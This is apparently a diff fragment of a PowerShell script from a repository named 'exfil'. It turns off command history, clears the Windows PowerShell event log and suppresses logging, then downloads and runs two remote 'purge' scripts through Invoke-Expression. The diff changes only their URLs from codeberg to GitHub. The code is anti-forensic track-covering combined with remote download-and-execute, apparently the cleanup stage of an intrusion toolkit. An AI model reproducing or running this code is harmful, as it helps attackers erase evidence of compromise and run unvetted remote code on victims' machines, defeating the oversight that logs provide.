@@ -5,7 +5,7 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$url1 = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/OpenSSHPurge.ps1"
-$url2 = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/ZTPurge.ps1"
+$url1 = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Sanitation/OpenSSHPurge.ps1"
+$url2 = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Sanitation/ZTPurge.ps1"
 Invoke-Expression (Invoke-WebRequest -Uri $url1 -UseBasicParsing).Content
 Invoke-Expression (Invoke-WebRequest -Uri $url2 -UseBasicParsing).Content
